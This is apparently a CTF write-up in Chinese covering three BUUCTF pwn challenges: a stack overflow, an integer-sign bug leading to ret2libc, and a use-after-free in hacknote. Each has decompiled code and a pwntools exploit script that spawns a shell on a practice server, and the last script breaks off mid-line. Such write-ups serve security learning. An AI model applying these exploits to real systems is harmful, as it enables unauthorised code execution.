<h2 id="pwn1_sctf_2016"><a class="markdownIt-Anchor" href="#pwn1_sctf_2016"></a> pwn1_sctf_2016</h2>
<h3 id="1checsec"><a class="markdownIt-Anchor" href="#1checsec"></a> 1.checsec</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-57"><a class="markdownIt-Anchor" href="#2ida-57"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>vuln</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [esp+3Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+40h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+48h] [ebp-10h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+4Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">32</span>, edata);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;input, &amp;s);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v5);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(&amp;v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v7);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(&amp;v6, <span class="string">&quot;I&quot;</span>, &amp;v7);</span><br><span class="line">  replace((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v3);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;input, &amp;v3, &amp;v6, &amp;v4);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v3);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v6);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v7);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v5);</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>string</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048154	00000013	C	/lib/ld-linux.so.2</span><br><span class="line">.............   ........    .   ..........</span><br><span class="line">LOAD:080488F4	00000007	C	strcpy</span><br><span class="line">LOAD:080488FB	00000006	C	stdin</span><br><span class="line">LOAD:08048901	00000007	C	<span class="built_in">printf</span></span><br><span class="line">LOAD:08048908	00000006	C	fgets</span><br><span class="line">LOAD:0804890E	0000000D	C	__cxa_atexit</span><br><span class="line">LOAD:0804891B	00000007	C	system</span><br><span class="line">LOAD:08048922	00000012	C	__libc_start_main</span><br><span class="line">LOAD:08048934	00000008	C	GCC_3.0</span><br><span class="line">LOAD:0804893C	0000000A	C	GLIBC_2.0</span><br><span class="line">LOAD:08048946	0000000C	C	GLIBC_2.1.3</span><br><span class="line">LOAD:08048952	0000000E	C	GLIBCXX_3.4.5</span><br><span class="line">LOAD:08048960	0000000B	C	CXXABI_1.3</span><br><span class="line">LOAD:0804896B	0000000C	C	GLIBCXX_3.4</span><br><span class="line">.rodata:080497F0	0000000D	C	<span class="built_in">cat</span> flag.txt</span><br><span class="line">.rodata:08049800	00000023	C	Tell me something about yourself: </span><br><span class="line">.rodata:08049829	00000008	C	So, %s\n</span><br><span class="line">.rodata:08049834	0000002A	C	basic_string::_S_construct null not valid</span><br><span class="line">.eh_frame:0804996F	00000005	C	;*2$\&quot;</span><br><span class="line">.eh_frame:0804999D	00000005	C	zPLR</span><br></pre></td></tr></table></figure>
<blockquote>
<p>看上去不会溢出，但是把’I’替换成’you’，使字符串变多，栈溢出</p>
</blockquote>
<h3 id="3exp-45"><a class="markdownIt-Anchor" href="#3exp-45"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25541</span>)</span><br><span class="line"></span><br><span class="line">cat_flag = <span class="number">0x08048F0D</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;I&#x27;</span>*<span class="number">20</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p64(cat_flag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="pwn2_sctf_2016"><a class="markdownIt-Anchor" href="#pwn2_sctf_2016"></a> pwn2_sctf_2016</h2>
<h3 id="1checksec-59"><a class="markdownIt-Anchor" href="#1checksec-59"></a> 1.checksec</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/o</span></span><br><span class="line"><span class="string">    Arch:     i386-32-little</span></span><br><span class="line"><span class="string">    RELRO:    Partial RELRO</span></span><br><span class="line"><span class="string">    Stack:    No canary found</span></span><br><span class="line"><span class="string">    NX:       NX enabled</span></span><br><span class="line"><span class="string">    PIE:      No PIE (0x8048000)</span></span><br></pre></td></tr></table></figure>
<h3 id="2ida-58"><a class="markdownIt-Anchor" href="#2ida-58"></a> 2.IDA</h3>
<p><strong>vuln</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> nptr; <span class="comment">// [esp+1Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many bytes do you want me to read? &quot;</span>);</span><br><span class="line">  get_n((<span class="type">int</span>)&amp;nptr, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(&amp;nptr);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;No! That size (%d) is too large!\n&quot;</span>, v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Ok, sounds good. Give me %u bytes of data!\n&quot;</span>, v2);</span><br><span class="line">  get_n((<span class="type">int</span>)&amp;nptr, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, &amp;nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>get_n</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">get_n</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">    </span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( !v4 || v4 == <span class="number">10</span> || v5 &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 = v5++;</span><br><span class="line">    *(_BYTE *)(v2 + a1) = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  result = a1 + v5;</span><br><span class="line">  *(_BYTE *)(a1 + v5) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里就存在一个atoi，输入-1时会转化为非零型整数，造成整数溢出</p>
</blockquote>
<blockquote>
<p>整数了过后，就可以写更多的值，从而getshell</p>
</blockquote>
<blockquote>
<p>溢出要覆盖的量可以从gdb调试出来</p>
</blockquote>
<h3 id="3exp-46"><a class="markdownIt-Anchor" href="#3exp-46"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn2_sctf_2016&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29632</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn2_sctf_2016&quot;)</span></span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x080483d0</span></span><br><span class="line">output_addr = <span class="number">0x080486F8</span></span><br><span class="line">vuln_addr = <span class="number">0x0804852F</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">48</span> </span><br><span class="line">payload += p32(printf_plt) + p32(start_addr) </span><br><span class="line">payload += p32(output_addr) + p32(elf.got[<span class="string">&quot;__libc_start_main&quot;</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(flat(payload))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;You said: &quot;</span>) <span class="comment">#一段无法输出完整</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;You said: &quot;</span>)</span><br><span class="line"></span><br><span class="line">main_real = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;__libc_start_main&#x27;,main_real)</span></span><br><span class="line">libcbase = main_real - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libcbase + libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">48</span> + p32(sys_addr)+p32(output_addr) + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;!&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="pwnable_hack_note"><a class="markdownIt-Anchor" href="#pwnable_hack_note"></a> pwnable_hack_note</h2>
<h3 id="1checksec-60"><a class="markdownIt-Anchor" href="#1checksec-60"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-59"><a class="markdownIt-Anchor" href="#2ida-59"></a> 2.IDA</h3>
<p>基本功能如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">add</span><span class="params">(size, content)</span>:</span><br><span class="line">    p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">&quot;1&quot;</span>)</span> </span><br><span class="line">    p.<span class="title function_">recvuntil</span><span class="params">(<span class="string">&quot;Note size :&quot;</span>)</span></span><br><span class="line">    p.<span class="title function_">sendline</span><span class="params">(str(size))</span></span><br><span class="line">    p.<span class="title function_">recvuntil</span><span class="params">(<span class="string">&quot;Content :&quot;</span>)</span></span><br><span class="line">    p.<span class="title function_">sendline</span><span class="params">(content)</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">delete</span><span class="params">(index)</span>:</span><br><span class="line">    p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">&quot;2&quot;</span>)</span></span><br><span class="line">    p.<span class="title function_">recvuntil</span><span class="params">(<span class="string">&quot;Index :&quot;</span>)</span></span><br><span class="line">    p.<span class="title function_">sendline</span><span class="params">(str(index))</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def <span class="title function_">show</span><span class="params">(index)</span>:</span><br><span class="line">    p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">&quot;3&quot;</span>)</span></span><br><span class="line">    p.<span class="title function_">recvuntil</span><span class="params">(<span class="string">&quot;Index :&quot;</span>)</span></span><br><span class="line">    p.<span class="title function_">sendline</span><span class="params">(str(index))</span></span><br></pre></td></tr></table></figure>
<p><strong>delete</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)ptr[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(ptr[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>指针没有归零</p>
</blockquote>
<h3 id="3gdb-9"><a class="markdownIt-Anchor" href="#3gdb-9"></a> 3.GDB</h3>
<h4 id="0x1-先申请一个chunk"><a class="markdownIt-Anchor" href="#0x1-先申请一个chunk"></a> 0x1 先申请一个chunk</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x804b000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 17, </span><br><span class="line">  fd = 0x804862b, </span><br><span class="line">  bk = 0x804b018, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x11</span><br><span class="line">&#125;</span><br><span class="line">0x804b010 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 17, </span><br><span class="line">  fd = 0x61616161, </span><br><span class="line">  bk = 0xa, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x20fe1</span><br><span class="line">&#125;</span><br><span class="line">0x804b020 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 135137, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x804b000:	0x00000000	0x00000011	0x0804862b	0x0804b018</span><br><span class="line">0x804b010:	0x00000000	0x00000011	0x61616161	0x0000000a</span><br><span class="line">0x804b020:	0x00000000	0x00020fe1	0x00000000	0x00000000</span><br><span class="line">0x804b030:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
<h4 id="0x2-查看0x0804862b和0x0804b018"><a class="markdownIt-Anchor" href="#0x2-查看0x0804862b和0x0804b018"></a> 0x2 查看<code>0x0804862b</code>和<code>0x0804b018</code></h4>
<p><strong>0x0804862b</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_804862B</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>0x0804b018</strong></p>
<p>该地址应该是绑定的分配堆的地址，到时候修补上就行</p>
<h3 id="4思路"><a class="markdownIt-Anchor" href="#4思路"></a> 4.思路</h3>
<ul>
<li>uaf，将<code>0x0804862b</code>改为一个我们能泄露的函数</li>
<li>计算<code>system</code>的相对位置</li>
<li>改<code>0x0804862b</code>为<code>system</code>，并传入<code>sh\x00\x00</code></li>
<li>调用原来的输出函数，输出的对象是刚才填入的<code>sh\x00\x00</code></li>
</ul>
<p>伪造过后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x860b000</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000011</span>	<span class="number">0x0804862b</span>	<span class="number">0x0860b030</span></span><br><span class="line"><span class="number">0x860b010</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000019</span>	<span class="number">0x0860b038</span>	<span class="number">0x61616161</span></span><br><span class="line"><span class="number">0x860b020</span>:	<span class="number">0x61616161</span>	<span class="number">0x61616161</span>	<span class="number">0x00000000</span>	<span class="number">0x00000011</span></span><br><span class="line"><span class="number">0x860b030</span>:	<span class="number">0x0804862b</span>	<span class="number">0x0804a018</span>	<span class="number">0x00000000</span>	<span class="number">0x00000019</span></span><br><span class="line"><span class="number">0x860b040</span>:	<span class="number">0x00000000</span>	<span class="number">0x61616161</span>	<span class="number">0x61616161</span>	<span class="number">0x61616161</span></span><br><span class="line"><span class="number">0x860b050</span>:	<span class="number">0x00000000</span>	<span class="number">0x00020fb1</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<h3 id="5exp-2"><a class="markdownIt-Anchor" href="#5exp-2"></a> 5.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">p = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">&quot;1&quot;</span>) </span><br><span class="line">    p.recvuntil(<span class="string">&quot;Note size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">ip,port,mode,debug</span>):</span><br><span class="line">	elf = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&quot;/home/joe1sn/libc/32/libc-2.23.so&quot;</span>)</span><br><span class="line">	<span class="keyword">global</span> p</span><br><span class="line">	<span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">		context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">		p = process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">	add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)    <span class="comment">#note0</span></span><br><span class="line">	add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)    <span class="comment">#note1</span></span><br><span class="line"></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	fun_addr=<span class="number">0x0804862B</span></span><br><span class="line">	add(<span class="number">8</span>,p32(fun_addr)+p32(elf.got[<span class="string">&quot;free&quot;</span>]))</span><br><span class="line">	show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	leak=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">	libc_base = 